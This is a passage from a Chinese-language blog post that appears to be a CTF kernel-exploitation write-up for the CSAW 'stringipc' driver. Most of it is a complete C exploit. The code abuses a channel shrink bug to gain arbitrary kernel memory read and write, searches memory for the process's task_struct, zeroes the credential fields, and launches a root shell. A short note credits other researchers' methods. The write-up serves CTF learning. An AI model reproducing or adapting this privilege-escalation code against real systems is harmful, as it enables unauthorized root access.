class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">for(int i=0;i&lt;44;i++)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = cred-0x10+4+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">        root_cred[0]=0;</span><br><span class="line">        write_channel.id = alloc_channel.id;</span><br><span class="line">        write_channel.count= 1;</span><br><span class="line">        write_channel.buf = (char*)root_cred;</span><br><span class="line">        ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">完整exp:</span><br><span class="line">```c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define CSAW_IOCTL_BASE     0x77617363</span><br><span class="line">#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span><br><span class="line">#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span><br><span class="line">#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span><br><span class="line">#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span><br><span class="line">#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span><br><span class="line">#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span><br><span class="line">#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span><br><span class="line">#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span><br><span class="line"></span><br><span class="line">struct alloc_channel_args &#123;</span><br><span class="line">    size_t buf_size;</span><br><span class="line">    int id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct open_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct shrink_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    size_t size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct read_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *buf;</span><br><span class="line">    size_t count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct write_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *buf;</span><br><span class="line">    size_t count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct seek_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">    loff_t index;</span><br><span class="line">    int whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct close_channel_args &#123;</span><br><span class="line">    int id;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    struct alloc_channel_args alloc_channel;</span><br><span class="line">    struct shrink_channel_args shrink_channel;</span><br><span class="line">    struct seek_channel_args seek_channel;</span><br><span class="line">    struct read_channel_args read_channel;</span><br><span class="line">    struct write_channel_args write_channel;</span><br><span class="line">    struct close_channel_args close_channel;</span><br><span class="line"></span><br><span class="line">    int fd = -1;</span><br><span class="line">    u_int64_t addr = 0xffff880000000000;</span><br><span class="line">    u_int64_t real_cred = 0;</span><br><span class="line">    u_int64_t cred = 0;</span><br><span class="line">    u_int64_t target_addr;</span><br><span class="line">    u_int64_t result = 0;</span><br><span class="line">    int root_cred[12];</span><br><span class="line"></span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    char *buf = malloc(0x1000);</span><br><span class="line">    char target[16];</span><br><span class="line">    strcpy(target,&quot;an9999999999ela&quot;);</span><br><span class="line">    prctl(PR_SET_NAME,target);</span><br><span class="line">    fd = open(&quot;/dev/csaw&quot;,O_RDWR);</span><br><span class="line">    if(fd&lt;0)&#123;</span><br><span class="line">        perror(&quot;open error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    alloc_channel.buf_size = 0x100;</span><br><span class="line">    alloc_channel.id = -1;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel);</span><br><span class="line">    if(alloc_channel.id == -1)&#123;</span><br><span class="line">        perror(&quot;alloc error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] you have got a channel %d\n&quot;,alloc_channel.id);</span><br><span class="line">    shrink_channel.id = alloc_channel.id;</span><br><span class="line">    shrink_channel.size = 0x101;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel);   //channel-&gt;date=0x10 channel-&gt;buf_size=0xffffffffffffffff</span><br><span class="line">    printf(&quot;[+] now we can read and write any mem\n&quot;);</span><br><span class="line">    for(;addr &lt; 0xffffc80000000000;addr += 0x1000)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = addr-0x10;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">        read_channel.id = alloc_channel.id;</span><br><span class="line">        read_channel.buf = buf;</span><br><span class="line">        read_channel.count = 0x1000;</span><br><span class="line">        ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line">        result = memmem(buf,0x1000,target,16);</span><br><span class="line">        if (result)</span><br><span class="line">		&#123;</span><br><span class="line">			cred = *(size_t *)(result - 0x8);</span><br><span class="line">			real_cred = *(size_t *)(result - 0x10);</span><br><span class="line">			if( (cred||0xff00000000000000) &amp;&amp; (real_cred == cred))&#123;</span><br><span class="line">				//printf(&quot;[]%lx[]&quot;,result-(int)(buf));</span><br><span class="line">				target_addr = addr + result-(int)(buf);</span><br><span class="line">				printf(&quot;[+]found task_struct 0x%lx\n&quot;,target_addr);</span><br><span class="line">				printf(&quot;[+]found cred 0x%lx\n&quot;,real_cred);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if(result == 0)&#123;</span><br><span class="line">		puts(&quot;not found , try again &quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;44;i++)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = cred-0x10+4+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line">        root_cred[0]=0;</span><br><span class="line">        write_channel.id = alloc_channel.id;</span><br><span class="line">        write_channel.count= 1;</span><br><span class="line">        write_channel.buf = (char*)root_cred;</span><br><span class="line">        ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(getuid() == 0)&#123;</span><br><span class="line">        printf(&quot;[+] root now \n&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一种的解法还算常规，第二三种解法就很骚了，看着p4nda和raycp两位大师傅的博客学的，师傅们tql!🤩,另外两种会单独再写两篇post。周一还有考试，赶紧去复习了😭。</p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2020/12/17/LibFuzzer(1)/" title="（转）LibFuzzer workshop学习之路（一）"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">上一页: （转）LibFuzzer workshop学习之路（一）</span></a><a class="button is-default" href="/2020/11/09/kernel_pwn(3)/" title="kernel_pwn UAF"><span class="has-text-weight-semibold">下一页: kernel_pwn UAF</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/An9Ela"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> An9Ela 2022</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>